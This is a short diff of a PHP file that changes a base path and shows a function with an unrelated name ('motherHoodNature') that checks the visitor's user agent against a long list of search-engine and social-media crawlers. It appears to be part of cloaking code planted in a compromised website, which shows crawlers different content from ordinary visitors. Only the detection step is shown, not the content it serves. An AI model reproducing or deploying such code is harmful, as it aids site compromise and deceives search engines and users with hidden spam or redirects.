@@ -1,5 +1,5 @@
 <?php
-$base_path = '/files/';
+$base_path = '/global/';
 function motherHoodNature()
 {
 return preg_match('/AhrefsBot|baiduspider|baidu|bingbot|bing|DuckDuckBot|facebookexternalhit|facebook|facebot|googlebot|\-google|google\-inspectiontool|Uptime\-Kuma|linkedin|Linkidator|linkwalker|mediapartners|mod_pagespeed|naverbot|pinterest|SemrushBot|twitterbot|twitter|xing|yahoo|YandexBot|YandexMobileBot|yandex|Zeus/i', $_SERVER['HTTP_USER_AGENT']);
